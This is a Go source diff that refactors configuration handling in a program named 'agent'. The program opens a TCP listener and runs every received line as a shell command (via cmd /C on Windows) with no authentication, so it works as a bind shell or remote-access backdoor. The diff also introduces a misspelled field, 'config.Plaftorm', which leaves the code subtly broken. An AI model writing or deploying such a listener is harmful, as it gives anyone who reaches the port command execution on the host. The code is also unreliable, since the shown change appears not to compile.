@@ -7,40 +7,38 @@ import (
 	"net"
 	"os/exec"
 	"strings"
-	"agent/pkg/config"
+	c "agent/pkg/config"
 )
 
 func main() {
-	err := config.ReadConfig()
+	config, err := c.ReadConfig()
 	if err != nil {
 		fmt.Println(err.Error())
 		return
 	}
-	listener(config.TcpAddr)
+	listener(config)
 }
 
-func listener(comms_data string) {
-	listen, err := net.Listen("tcp", comms_data)
-
+func listener(config *c.Config) {
+	listen, err := net.Listen("tcp", config.TcpAddr)
 	if err != nil {
 		log.Fatalln("Unable to start listener, port is in use")
 	}
 	defer listen.Close()
-	fmt.Println("Listening on " + comms_data)
+	fmt.Println("Listening on " + config.TcpAddr)
 	for {
 		conn, err := listen.Accept()
 		if err != nil {
 			log.Fatalln("Unable to accept connection", err.Error())
 		}
-		go handleRequest(conn)
+		go handleRequest(conn, config)
 
 	}
 }
-
-func handleRequest(conn net.Conn) {
+func handleRequest(conn net.Conn, config *c.Config) {
 	for {
 		message, _ := bufio.NewReader(conn).ReadString('\n')
-		if (config.Platform == "Windows"){
+		if ( config.Plaftorm == "Windows"){
 			out, err := exec.Command(config.Shell, "/C", strings.TrimSuffix(message, "\n")).Output()
 		if err != nil {
 			fmt.Println("unable to run command,", conn, "%s", err)
